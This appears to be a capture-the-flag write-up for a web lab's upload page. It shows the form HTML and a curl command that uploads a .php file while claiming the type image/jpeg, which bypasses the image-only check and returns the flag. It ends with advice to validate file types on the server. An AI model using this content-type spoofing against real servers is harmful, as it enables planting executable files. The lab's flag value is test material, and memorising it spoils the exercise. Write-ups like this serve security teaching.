# MEMBERS PAGE

## Explanations

We found a page to upload files. And after testing multiple files, it seems to only accept images.

Here is the HTML code:
```html
<form enctype="multipart/form-data" action="#" method="POST">
	<input type="hidden" name="MAX_FILE_SIZE" value="100000">
	Choose an image to upload:
	<br>
	<input name="uploaded" type="file"><br>
	<br>
	<input type="submit" name="Upload" value="Upload">
</form>
```

The interesting thing is that we have 2 inputs (`uploaded` & `Upload`), the first one letting us upload a file (an image if we deduce from our previous tests).  
It seems like we could "trick" this form by uploading any file we want and just let him think that the type is an image.

And here comes `curl` that can permit us to POST any file. Let's create en empty malicious file and trick the form:
```
> touch /tmp/malicious.php
> curl -s -X POST -F "uploaded=@/tmp/malicious.php;type=image/jpeg" -F "Upload=Upload" "http://<IP>/index.php?page=upload"
```

Bingo, we finally get our flag !
```html
<center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
```

---

## How to avoid that security breach ?

Simply just do your "file type" checking on the backend and not on the front. It is always good that we do not get a corrupted file !

---

#### Sources

- [curl -F flag](https://curl.se/docs/manpage.html#-F)
